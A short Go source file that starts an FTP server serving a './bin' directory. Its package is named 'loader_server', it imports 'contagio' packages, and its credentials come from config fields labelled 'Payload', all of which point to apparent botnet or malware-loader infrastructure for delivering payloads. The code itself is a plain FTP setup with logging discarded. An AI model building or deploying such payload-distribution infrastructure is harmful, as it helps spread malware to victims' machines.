package loader_server

import (
	"contagio/contagio/config"
	"contagio/contagio/config/logging"
	"strconv"
	"strings"

	filedriver "github.com/goftp/file-driver"

	"github.com/goftp/server"
)

func StartFtp(c *config.Config) {
	port, _ := strconv.Atoi(strings.Split(c.FtpServer, ":")[1])
	var perm = server.NewSimplePerm("root", "root")
	opt := &server.ServerOpts{
		Factory: &filedriver.FileDriverFactory{
			RootPath: "./bin",
			Perm:     perm,
		},
		Hostname: strings.Split(c.FtpServer, ":")[0],
		Port:     port,
		Auth: &server.SimpleAuth{
			Name:     c.Payload.FtpLogin,
			Password: c.Payload.FtpPassword,
		},
		Logger: new(server.DiscardLogger),
	}

	s := server.NewServer(opt)
	logging.PrintInfo("Ftp server ready: " + c.FtpServer)
	go func() {
		err := s.ListenAndServe()
		if err != nil {
			logging.PrintError("Ftp fatal error: " + err.Error())
			c.Wg.Done()
			return
		}
	}()
}
